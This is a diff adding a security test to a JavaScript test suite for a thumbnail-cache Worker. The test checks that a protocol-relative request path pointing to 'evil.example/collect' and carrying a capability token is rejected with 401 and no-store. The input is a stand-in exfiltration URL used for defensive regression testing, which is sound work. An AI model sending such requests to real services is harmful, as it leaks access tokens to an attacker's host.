@@ -33,6 +33,17 @@ beforeAll(() => {
 afterEach(() => fetchMock.assertNoPendingInterceptors());
 
 describe('thumbnail-cache Worker', () => {
+	it('does not proxy protocol-relative paths carrying capability-shaped tokens', async () => {
+		const request = new IncomingRequest(
+			`https://example.com//evil.example/collect?token=${capabilityToken()}`,
+		);
+		const ctx = createExecutionContext();
+		const response = await worker.fetch(request, env, ctx);
+		await waitOnExecutionContext(ctx);
+		expect(response.status).toBe(401);
+		expect(response.headers.get('cache-control')).toBe('no-store');
+	});
+
 	it('proxies URL capabilities to the origin without reading or populating R2', async () => {
 		const capability = capabilityToken();
 		const bytes = new Uint8Array([7, 8, 9]);
